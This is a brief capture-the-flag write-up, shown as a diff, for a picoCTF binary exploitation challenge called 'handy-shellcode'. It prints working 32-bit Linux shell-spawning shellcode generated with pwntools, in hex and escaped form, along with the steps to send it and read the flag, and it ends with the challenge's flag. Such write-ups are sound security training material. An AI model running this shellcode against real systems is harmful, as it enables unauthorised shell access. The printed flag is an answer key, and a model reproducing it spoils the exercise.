@@ -1,0 +1,30 @@
+Binary Exploitation: handy-shellcode
+
+This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt?
+You can find the program in /problems/handy-shellcode_4_037bd47611d842b565cfa1f378bfd8d9  on the shell server. Source.
+
+----------------------------------------
+
+vuln:     setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=7b65
+
+use pwntools to generate the shellcode
+however need to run this in an interactive session either on the server or over ssh
+
+
+premade shellcode for 32 bit linux i386
+pwn shellcraft i386.linux.sh
+
+6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80
+
+\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80
+
+
+after attach to process and recieve the initial print message,
+then asmsendline the shellcode data and start interactive shell
+finally cat the flag file
+
+----------------------------------------
+
+
+picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}
+
